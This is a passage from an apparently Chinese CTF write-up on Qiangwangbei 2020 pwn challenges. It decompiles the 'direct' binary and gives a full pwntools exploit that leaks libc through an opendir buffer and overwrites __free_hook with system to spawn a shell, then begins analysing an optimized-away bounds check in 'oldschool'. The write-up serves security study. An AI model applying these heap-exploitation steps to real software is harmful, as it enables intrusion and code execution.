  result <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> qword_202100<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202100<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      qword_202100<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
      result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>qword_202060<span class="token punctuation">;</span>
      qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>这show函数其实就是dele函数，没啥看的</p>
<p>再看到open_file函数</p>
<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">open_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  ssize_t result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>

  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_2020E0<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_2020E0 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    dirp <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dirp <span class="token punctuation">)</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    dword_2020E0 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>其中有一个opendir函数</p>
<pre><code>OPENDIR(3)                                                                   Linux Programmer's Manual                                                                  OPENDIR(3)

NAME
       opendir, fdopendir - open a directory

SYNOPSIS
       #include &lt;sys/types.h&gt;
       #include &lt;dirent.h&gt;

       DIR *opendir(const char *name);
       DIR *fdopendir(int fd);

   Feature Test Macro Requirements for glibc (see feature_test_macros(7)):

       fdopendir():
           Since glibc 2.10:
               _POSIX_C_SOURCE &gt;= 200809L
           Before glibc 2.10:
               _GNU_SOURCE

DESCRIPTION
       The  opendir() function opens a directory stream corresponding to the directory name, and returns a pointer to the directory stream.  The stream is positioned at the first
       entry in the directory.
</code></pre><p>作用就是打开一个目录，返回DIR *形态的目录流</p>
<p>再看到close__file函数</p>
<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">close_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  ssize_t result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  ssize_t v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>

  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_2020E0<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_2020E0 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span><span class="token function">readdir</span><span class="token punctuation">(</span>dirp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v1 <span class="token operator">=</span> result<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Filename: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>有一个readdir函数</p>
<pre><code>READDIR(3)                                                                   Linux Programmer's Manual                                                                  READDIR(3)

NAME
       readdir - read a directory

SYNOPSIS
       #include &lt;dirent.h&gt;

       struct dirent *readdir(DIR *dirp);

DESCRIPTION
       The readdir() function returns a pointer to a dirent structure representing the next directory entry in the directory stream pointed to by dirp.  It returns NULL on reach‐
       ing the end of the directory stream or if an error occurred.

       In the glibc implementation, the dirent structure is defined as follows:

           struct dirent {
               ino_t          d_ino;       /* Inode number */
               off_t          d_off;       /* Not an offset; see below */
               unsigned short d_reclen;    /* Length of this record */
               unsigned char  d_type;      /* Type of file; not supported
                                              by all filesystem types */
               char           d_name[256]; /* Null-terminated filename */
           };
</code></pre><p>返回值为下一个目录的进入点</p>
<p>整理一下题目信息</p>
<p>1.存在上溢</p>
<p>2.无输出功能</p>
<p>这题程序没有输出功能，而且所有的打印函数都是write而不是puts，利用stdout结构体泄露地址需要利用puts函数，所以这题不能用stdout来泄露</p>
<p>程序中可以进行输出的地方只有close_file功能，open_dir之后close_dir就会依次输出当前文件夹下文件的名称</p>
<p>opendir函数会申请一个0x8040大小的缓冲区</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C16.jpg" alt=""></p>
<p>缓冲区的内容如下</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C17.jpg" alt=""></p>
<p>如果我们能将main_arena+88的地址落入缓冲区中存储着文件名的位置，当输出文件名时就会输出main_arena+88的地址</p>
<p>我们需要构造出chunkoverlap，把opendir申请的缓冲区包含进去，类似于off-by-null/one的利用手法，然后逐步申请unsortedbin，让main_arena+88的地址落入opendir的缓冲区中，exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./direct'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'direct'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Offset: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">open_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">read_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
open_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>
read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>
read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x110</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x8040</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>
read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebca0</span>
system <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
open_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>
read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>
read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre>
<p>这一段的作用是为后面的overlap构造好chunk，然后将0x100的tcache填满</p>
<pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x110</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x8040</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre>
<p>然后dele掉chunk0，利用上溢通过chunk3修改chunk2的prev_size为opendir_chunk+chunk1+chunk0，将chunk2的size的prev_inuse位置0，然后dele掉chunk2，就会触发unlink，chunk2通过prev_size找到chunk0，而chunk1和opendir_chunk仍在使用状态，构造出chunkoverlap</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C18.jpg" alt=""></p>
<p>可以看到unsortedbin确实是从chunk0开始的</p>
<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">)</span></code></pre>
<p>这一段是错位分配chunk，使chunk1的fd被chunk2包含，同时使main_arena+88正好落入原本的“libc-2.27.so”的位置处</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C19.jpg" alt=""></p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C20.jpg" alt=""></p>
<pre class=" language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>
read_dir<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>这一段要填充空字符，否则只会输出三个字节</p>
<p>有了libc地址之后，dele掉chunk1，然后通过chunk2修改chunk1的fd指向free_hook，修改free_hook的值为system即可</p>
<h3 id="0x3-oldschool"><a href="#0x3-oldschool" class="headerlink" title="0x3.oldschool"></a>0x3.oldschool</h3><p>这题直接给的源码，编译方式为<code>Ubuntu 18.04, GCC -m32 -O3</code>，还需要安装一个gcc的编译环境</p>
<pre class=" language-shell"><code class="language-shell">apt-get install gcc-multilib</code></pre>
<p>编译命令中的-m32是编译为32位程序，-O3则是优化级别为3，将其编译之后在IDA中对照着源码进行审计</p>
<p>其中allocate、edit、show、dele、mmap_allocate编译前后没有发生什么变化，但mmap_edit中的if判断被优化掉了，如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">mmap_edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//源码</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>g_ptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Mmap first!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">unsigned</span> value<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> idx<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    idx <span class="token operator">=</span> <span class="token function">get_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

    <span class="token keyword">if</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> idx <span class="token operator">&lt;</span> g_ptr <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> idx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> ADDR_HIGH<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    value <span class="token operator">=</span> <span class="token function">get_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    g_ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">mmap_edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//IDA反编译结果</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// edi</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-18h]</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> g_ptr <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1110<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>
    v0 <span class="token operator">=</span> v2<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xEFFFFFFF</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1110<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
LABEL_3<span class="token punctuation">:</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v0<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>源码中的</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> idx <span class="token operator">&lt;</span> g_ptr <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> idx<span class="token punctuation">)</span> <span class="token operator">&lt;</span> ADDR_HIGH<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>被优化为了</p>
